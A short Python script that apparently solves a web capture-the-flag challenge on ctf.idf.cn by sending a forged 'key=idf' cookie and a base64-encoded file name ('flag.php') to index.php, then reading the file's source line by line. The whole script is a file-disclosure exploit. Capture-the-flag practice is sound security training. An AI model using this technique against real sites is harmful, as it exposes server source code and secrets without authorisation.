#!/usr/bin/env python3.4

import requests

url = 'http://ctf.idf.cn/game/web/40/index.php?file=ZmxhZy5waHA=&line='
line= 0
s = requests.session()
cookie={'key':'idf'}
while True:
	r = s.get(url+str(line),cookies=cookie)
	if not r.text:
		break
	print(r.text.strip('\n'))
	line += 1
